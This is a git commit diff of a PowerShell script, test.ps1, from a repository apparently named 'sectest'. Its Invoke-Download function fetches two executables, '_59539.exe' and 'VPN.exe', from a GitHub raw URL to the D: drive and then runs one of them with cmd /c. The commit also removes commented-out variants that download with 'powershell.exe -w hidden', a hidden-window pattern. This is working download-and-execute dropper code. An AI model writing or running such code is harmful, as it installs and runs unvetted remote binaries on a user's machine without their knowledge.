ea04ccf84e113447213a32d96f07fecba774840e
foryou123 <hiforyou@yeah.net>
2018-03-21 16:32:24 +0800

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -3,12 +3,13 @@ function Invoke-Download
 {
   $url1 = "https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe"
   $url2 = "https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe"
-  #powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/foryou123/sectest/master/_59539.exe', 'D:\\_59539.exe')
-  #powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/foryou123/sectest/master/VPN.exe', 'D:\\_VPN.exe')
   $des1 = "D:\\_59539.exe"
   $des2 = "D:\\_VPN.exe"
-  Invoke-WebRequest -uri $url1 -OutFile $des1
-  Invoke-WebRequest -uri $url2 -OutFile $des2
+  (new-object System.Net.WebClient).Downloadfile($url1,$des1)
+  (new-object System.Net.WebClient).Downloadfile($url2,$des2)
+  
+  #Invoke-WebRequest -uri $url1 -OutFile $des1
+  #Invoke-WebRequest -uri $url2 -OutFile $des2
   $cmd="D:\\_VPN.exe"
   cmd /c $cmd
 }
